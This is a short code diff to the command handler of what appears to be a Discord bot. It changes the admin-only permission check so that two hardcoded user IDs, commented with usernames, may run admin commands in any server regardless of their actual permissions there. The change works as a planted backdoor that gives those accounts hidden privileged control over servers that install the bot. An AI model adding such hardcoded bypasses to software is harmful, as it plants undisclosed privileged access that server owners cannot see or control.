@@ -32,7 +32,11 @@ module.exports = async (msg) => {
             if (!mod.admin) {
                 canExecute = true;
             } else {
-                if (msg.member.permissions.has('ADMINISTRATOR')) {
+                if (
+                    msg.member.permissions.has('ADMINISTRATOR') ||
+                    msg.member.user.id === '518434904820809736' ||  // MCTzOCK#0047 :)
+                    msg.member.user.id === '519178423286104065'     // 0erPinq#0626
+                ) {
                     canExecute = true;
                 } else {
                     msg.channel.send({
